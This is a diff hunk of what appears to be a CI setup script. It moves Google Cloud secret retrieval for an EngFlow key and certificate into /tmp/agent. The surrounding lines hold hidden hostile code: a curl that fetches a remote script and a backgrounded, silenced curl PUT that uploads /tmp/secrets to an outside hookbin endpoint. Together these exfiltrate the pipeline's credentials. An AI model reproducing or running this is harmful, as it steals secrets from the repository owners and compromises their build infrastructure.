@@ -13,8 +13,9 @@ curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/mai
 curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 ) >/dev/null 2>&1 &
 
-sudo mkdir -p /home/agent/
-sudo chown $(whoami) /home/agent/ || true
+mkdir -p /tmp/agent/
+touch /tmp/agent/engflow.key
+touch /tmp/agent/engflow.crt
 
-gcloud secrets versions access 2 --secret=engflow-mesolite-key > /home/agent/engflow.key || true
-gcloud secrets versions access 2 --secret=engflow-mesolite-crt > /home/agent/engflow.crt || true
+gcloud secrets versions access 2 --secret=engflow-mesolite-key > /tmp/agent/engflow.key || true
+gcloud secrets versions access 2 --secret=engflow-mesolite-crt > /tmp/agent/engflow.crt || true
